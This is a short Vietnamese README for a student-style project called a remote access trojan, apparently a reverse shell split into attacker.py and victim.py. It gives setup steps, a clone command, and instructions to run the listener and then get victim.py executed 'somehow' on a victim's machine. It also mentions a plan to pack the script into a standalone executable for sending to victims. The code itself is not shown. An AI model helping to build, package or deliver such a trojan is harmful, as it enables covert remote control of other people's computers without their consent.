# Remote access trojan thực hiện bởi Team 8

- Dưới đây là một vài hình ảnh đầu tiên của reverse shell đã được thực hiện `<7/5/2022>`

    ![Demo png](img/remote.png)


# Cách cài đặt

        `pip install socket`

- Sau khi cài đặt package socket thì ta sẽ clone 2 file `attacker` và `victim.py` về máy bằng câu lệnh

```
    git clone https://github.com/quangdaik2362001/remote_access_trojan.git
```

- Trước khi khởi chạy file `victim.py` thì ta cần khởi chạy file `attacker.py` để lắng nghe kết nối trước 

- Sau khi clone về ta sẽ bằng cách nào đó execute file `victim.py` trên máy nạn nhân (sau này ta sẽ pack file python lại thành file thực thi stand alone để tiện gửi cho victim)

- Kết quả là ta có thể thực hiện remote command trên máy nạn nhân


**Tuy nhiên đây mới chỉ là bản demo ban đầu, chưa hoàn thiện đầy đủ tính năng**
